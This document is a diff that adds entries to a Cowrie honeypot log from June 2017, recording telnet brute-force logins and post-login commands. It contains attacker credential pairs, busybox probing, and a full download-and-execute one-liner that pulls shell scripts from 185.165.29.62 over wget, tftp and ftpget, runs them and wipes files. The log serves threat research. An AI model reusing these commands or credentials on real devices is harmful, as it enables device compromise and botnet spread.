@@ -5666,3 +5666,98 @@
 2017-06-08T03:53:59+0000 [SSHChannel None (119) on SSHService 'ssh-connection' on HoneyPotSSHTransport,10175,91.195.103.217] sending close 119
 2017-06-08T03:53:59+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,10175,91.195.103.217] got channel 'direct-tcpip' request
 2017-06-08T03:53:59+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,10175,91.195.103.217] direct-tcp connection request to 98.138.112.38:25 from localhost:5556
+2017-06-08T03:54:04+0000 [SSHChannel None (120) on SSHService 'ssh-connection' on HoneyPotSSHTransport,10175,91.195.103.217] remote eof
+2017-06-08T03:54:04+0000 [SSHChannel None (120) on SSHService 'ssh-connection' on HoneyPotSSHTransport,10175,91.195.103.217] remote close
+2017-06-08T03:54:04+0000 [SSHChannel None (120) on SSHService 'ssh-connection' on HoneyPotSSHTransport,10175,91.195.103.217] sending close 120
+2017-06-08T03:54:11+0000 [CowrieTelnetTransport,26882,109.236.83.181] Connection lost after 131 seconds
+2017-06-08T03:54:26+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 109.236.83.181:41221 (10.8.41.81:2223) [session: TT26889]
+2017-06-08T03:54:31+0000 [CowrieTelnetTransport,26889,109.236.83.181] login attempt: 7782
+2017-06-08T03:54:31+0000 [CowrieTelnetTransport,26889,109.236.83.181] login return, expect: [default/]
+2017-06-08T03:54:33+0000 [CowrieTelnetTransport,26889,109.236.83.181] login attempt [admin/7ujMko0admin] failed
+2017-06-08T03:54:33+0000 [CowrieTelnetTransport,26889,109.236.83.181] Warning: state changed and new state returned
+2017-06-08T03:54:33+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 185.165.29.62:34988 (10.8.41.81:2223) [session: TT26890]
+2017-06-08T03:54:34+0000 [CowrieTelnetTransport,26890,185.165.29.62] login attempt: 8
+2017-06-08T03:54:34+0000 [CowrieTelnetTransport,26890,185.165.29.62] login return, expect: [root/]
+2017-06-08T03:54:36+0000 [CowrieTelnetTransport,26890,185.165.29.62] login attempt [root/] succeeded
+2017-06-08T03:54:37+0000 [CowrieTelnetTransport,26890,185.165.29.62] Opening TTY Log: log/tty/20170608-035437-None-26890i.log
+2017-06-08T03:54:37+0000 [CowrieTelnetTransport,26890,185.165.29.62] Warning: state changed and new state returned
+2017-06-08T03:54:37+0000 [CowrieTelnetTransport,26890,185.165.29.62] CMD: sh
+2017-06-08T03:54:37+0000 [CowrieTelnetTransport,26890,185.165.29.62] Command found: sh 
+2017-06-08T03:54:37+0000 [CowrieTelnetTransport,26890,185.165.29.62] CMD: cd /tmp || cd /var/run || rm -f *; wget http://185.165.29.62/sc.sh; busybox wget http://185.165.29.62/sc.sh; sh sc.sh; tftp 185.165.29.62 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 185.165.29.62; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.165.29.62 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf sc.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+2017-06-08T03:54:37+0000 [CowrieTelnetTransport,26890,185.165.29.62] Command found: cd /tmp
+2017-06-08T03:54:37+0000 [CowrieTelnetTransport,26890,185.165.29.62] Command found: cd /var/run
+2017-06-08T03:54:37+0000 [CowrieTelnetTransport,26890,185.165.29.62] Command found: rm -f /var/run/sshd.pid /var/run/sshd /var/run/crond.reboot /var/run/crond.pid /var/run/acpid.pid /var/run/acpid.socket /var/run/motd.dynamic /var/run/dhclient.eth0.pid /var/run/network /var/run/shm /var/run/mount /var/run/lock /var/run/sendsigs.omit.d /var/run/initctl /var/run/utmp /var/run/udev /var/run/initramfs
+2017-06-08T03:54:37+0000 [CowrieTelnetTransport,26890,185.165.29.62] Command found: wget http://185.165.29.62/sc.sh
+2017-06-08T03:54:37+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.29.62/sc.sh>
+2017-06-08T03:54:39+0000 [CowrieTelnetTransport,26889,109.236.83.181] login attempt: 7783
+2017-06-08T03:54:39+0000 [CowrieTelnetTransport,26889,109.236.83.181] login return, expect: [default/]
+2017-06-08T03:54:41+0000 [CowrieTelnetTransport,26889,109.236.83.181] login attempt [enable/system] failed
+2017-06-08T03:54:41+0000 [CowrieTelnetTransport,26889,109.236.83.181] Warning: state changed and new state returned
+2017-06-08T03:54:41+0000 [CowrieTelnetTransport,26889,109.236.83.181] login attempt: 7784
+2017-06-08T03:54:41+0000 [CowrieTelnetTransport,26889,109.236.83.181] login return, expect: [default/]
+2017-06-08T03:54:43+0000 [CowrieTelnetTransport,26889,109.236.83.181] login attempt [shell/sh] failed
+2017-06-08T03:54:43+0000 [CowrieTelnetTransport,26889,109.236.83.181] Warning: state changed and new state returned
+2017-06-08T03:54:43+0000 [CowrieTelnetTransport,26883,109.236.83.181] Connection lost after 141 seconds
+2017-06-08T03:54:43+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 111.43.223.189:53518 (10.8.41.81:2223) [session: TT26891]
+2017-06-08T03:54:43+0000 [HTTPPageDownloader,client] Not storing duplicate content bddd2effcb332e93989cea45858cc7ea312413a9e4e12938903ff79e59ec45f2
+2017-06-08T03:54:43+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.165.29.62/sc.sh) with SHA-256 bddd2effcb332e93989cea45858cc7ea312413a9e4e12938903ff79e59ec45f2 to dl/bddd2effcb332e93989cea45858cc7ea312413a9e4e12938903ff79e59ec45f2
+2017-06-08T03:54:43+0000 [HTTPPageDownloader,client] Command found: busybox wget http://185.165.29.62/sc.sh
+2017-06-08T03:54:43+0000 [HTTPPageDownloader,client] Command found: wget http://185.165.29.62/sc.sh
+2017-06-08T03:54:43+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://185.165.29.62/sc.sh>
+2017-06-08T03:54:43+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.29.62/sc.sh>
+2017-06-08T03:54:43+0000 [HTTPPageDownloader,client] Not storing duplicate content bddd2effcb332e93989cea45858cc7ea312413a9e4e12938903ff79e59ec45f2
+2017-06-08T03:54:43+0000 [HTTPPageDownloader,client] Downloaded URL (http://185.165.29.62/sc.sh) with SHA-256 bddd2effcb332e93989cea45858cc7ea312413a9e4e12938903ff79e59ec45f2 to dl/bddd2effcb332e93989cea45858cc7ea312413a9e4e12938903ff79e59ec45f2
+2017-06-08T03:54:43+0000 [HTTPPageDownloader,client] Command found: sh /var/run/sc.sh
+2017-06-08T03:54:43+0000 [HTTPPageDownloader,client] Command found: tftp 185.165.29.62 -c get tftp1.sh
+2017-06-08T03:54:43+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp1.sh
+2017-06-08T03:54:43+0000 [HTTPPageDownloader,client] Command found: sh tftp1.sh
+2017-06-08T03:54:43+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 185.165.29.62
+2017-06-08T03:54:43+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp2.sh
+2017-06-08T03:54:43+0000 [HTTPPageDownloader,client] Command found: sh tftp2.sh
+2017-06-08T03:54:43+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 185.165.29.62 ftp1.sh ftp1.sh
+2017-06-08T03:54:44+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://185.165.29.62/ftp1.sh) with SHA-256 f47ae12d78395307d836f2779669fd110be3ed57544a37e639060799bfae745d to dl/f47ae12d78395307d836f2779669fd110be3ed57544a37e639060799bfae745d
+2017-06-08T03:54:44+0000 [HTTPPageDownloader,client] Command found: sh /var/run/ftp1.sh
+2017-06-08T03:54:44+0000 [HTTPPageDownloader,client] Command found: rm -rf /var/run/sc.sh tftp1.sh tftp2.sh /var/run/ftp1.sh
+2017-06-08T03:54:44+0000 [HTTPPageDownloader,client] Command found: rm -rf /var/run/sshd /var/run/network /var/run/shm /var/run/mount /var/run/lock /var/run/sendsigs.omit.d /var/run/udev /var/run/initramfs
+2017-06-08T03:54:44+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://185.165.29.62/sc.sh>
+2017-06-08T03:54:45+0000 [CowrieTelnetTransport,26891,111.43.223.189] first time for 111.43.223.189, need: 1
+2017-06-08T03:54:45+0000 [CowrieTelnetTransport,26891,111.43.223.189] login attempt: 1
+2017-06-08T03:54:47+0000 [CowrieTelnetTransport,26891,111.43.223.189] login attempt [root/anko] succeeded
+2017-06-08T03:54:48+0000 [CowrieTelnetTransport,26891,111.43.223.189] Opening TTY Log: log/tty/20170608-035448-None-26891i.log
+2017-06-08T03:54:48+0000 [CowrieTelnetTransport,26891,111.43.223.189] Warning: state changed and new state returned
+2017-06-08T03:54:48+0000 [CowrieTelnetTransport,26884,109.236.83.181] Connection lost after 131 seconds
+2017-06-08T03:54:49+0000 [CowrieTelnetTransport,26891,111.43.223.189] CMD: enable
+2017-06-08T03:54:49+0000 [CowrieTelnetTransport,26891,111.43.223.189] Command found: enable 
+2017-06-08T03:54:49+0000 [CowrieTelnetTransport,26891,111.43.223.189] Reading txtcmd from "txtcmds/bin/enable"
+2017-06-08T03:54:50+0000 [CowrieTelnetTransport,26891,111.43.223.189] CMD: system
+2017-06-08T03:54:50+0000 [CowrieTelnetTransport,26891,111.43.223.189] Command not found: system
+2017-06-08T03:54:50+0000 [CowrieTelnetTransport,26891,111.43.223.189] CMD: shell
+2017-06-08T03:54:50+0000 [CowrieTelnetTransport,26891,111.43.223.189] Command not found: shell
+2017-06-08T03:54:50+0000 [CowrieTelnetTransport,26890,185.165.29.62] Not storing duplicate content f47ae12d78395307d836f2779669fd110be3ed57544a37e639060799bfae745d
+2017-06-08T03:54:50+0000 [CowrieTelnetTransport,26890,185.165.29.62] Saved redir contents with SHA-256 f47ae12d78395307d836f2779669fd110be3ed57544a37e639060799bfae745d to dl/f47ae12d78395307d836f2779669fd110be3ed57544a37e639060799bfae745d
+2017-06-08T03:54:50+0000 [CowrieTelnetTransport,26890,185.165.29.62] Not storing duplicate content bddd2effcb332e93989cea45858cc7ea312413a9e4e12938903ff79e59ec45f2
+2017-06-08T03:54:50+0000 [CowrieTelnetTransport,26890,185.165.29.62] Saved redir contents with SHA-256 bddd2effcb332e93989cea45858cc7ea312413a9e4e12938903ff79e59ec45f2 to dl/bddd2effcb332e93989cea45858cc7ea312413a9e4e12938903ff79e59ec45f2
+2017-06-08T03:54:50+0000 [CowrieTelnetTransport,26890,185.165.29.62] Not storing duplicate content bddd2effcb332e93989cea45858cc7ea312413a9e4e12938903ff79e59ec45f2
+2017-06-08T03:54:50+0000 [CowrieTelnetTransport,26890,185.165.29.62] Saved redir contents with SHA-256 bddd2effcb332e93989cea45858cc7ea312413a9e4e12938903ff79e59ec45f2 to dl/bddd2effcb332e93989cea45858cc7ea312413a9e4e12938903ff79e59ec45f2
+2017-06-08T03:54:50+0000 [CowrieTelnetTransport,26890,185.165.29.62] Closing TTY Log: log/tty/20170608-035437-None-26890i.log after 13 seconds
+2017-06-08T03:54:50+0000 [CowrieTelnetTransport,26890,185.165.29.62] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionLost'>: Connection to the other side was lost in a non-clean fashion.
+	]
+2017-06-08T03:54:50+0000 [CowrieTelnetTransport,26890,185.165.29.62] Connection lost after 17 seconds
+2017-06-08T03:54:51+0000 [CowrieTelnetTransport,26891,111.43.223.189] CMD: sh
+2017-06-08T03:54:51+0000 [CowrieTelnetTransport,26891,111.43.223.189] Command found: sh 
+2017-06-08T03:54:51+0000 [CowrieTelnetTransport,26891,111.43.223.189] CMD:  /bin/busybox wget; /bin/busybox 81c46036wget; /bin/busybox echo -ne '\x0181c46036\x7f'; /bin/busybox printf '\00281c46036\177'; /bin/echo -ne '\x0381c46036\x7f'; /usr/bin/printf '\00481c46036\177'; /bin/busybox tftp; /bin/busybox 81c46036tftp;
+2017-06-08T03:54:51+0000 [CowrieTelnetTransport,26891,111.43.223.189] Command found: /bin/busybox wget
+2017-06-08T03:54:51+0000 [CowrieTelnetTransport,26891,111.43.223.189] Command found: wget
+2017-06-08T03:54:51+0000 [CowrieTelnetTransport,26891,111.43.223.189] Command found: /bin/busybox 81c46036wget
+2017-06-08T03:54:51+0000 [CowrieTelnetTransport,26891,111.43.223.189] Command found: /bin/busybox echo -ne '\x0181c46036\x7f'
+2017-06-08T03:54:51+0000 [CowrieTelnetTransport,26891,111.43.223.189] Command found: echo -ne '\x0181c46036\x7f'
+2017-06-08T03:54:51+0000 [CowrieTelnetTransport,26891,111.43.223.189] Command found: /bin/busybox printf '\00281c46036\177'
+2017-06-08T03:54:51+0000 [CowrieTelnetTransport,26891,111.43.223.189] Command found: /bin/echo -ne '\x0381c46036\x7f'
+2017-06-08T03:54:51+0000 [CowrieTelnetTransport,26891,111.43.223.189] Command not found: /usr/bin/printf '\00481c46036\177'
+2017-06-08T03:54:51+0000 [CowrieTelnetTransport,26891,111.43.223.189] Command found: /bin/busybox tftp
+2017-06-08T03:54:51+0000 [CowrieTelnetTransport,26891,111.43.223.189] Command found: tftp
+2017-06-08T03:54:51+0000 [CowrieTelnetTransport,26891,111.43.223.189] Command found: /bin/busybox 81c46036tftp
+2017-06-08T03:54:52+0000 [CowrieTelnetTransport,26891,111.43.223.189] CMD:  /bin/busybox dd if=/bin/busybox bs=22 count=1 || /bin/busybox cat /bin/busybox
+2017-06-08T03:54:52+0000 [CowrieTelnetTransport,26891,111.43.223.189] Command found: /bin/busybox dd if=/bin/busybox bs=22 count=1
+2017-06-08T03:54:52+0000 [CowrieTelnetTransport,26891,111.43.223.189] Command found: /bin/busybox cat /bin/busybox
+2017-06-08T03:54:52+0000 [CowrieTelnetTransport,26891,111.43.223.189] Command found: cat /bin/busybox
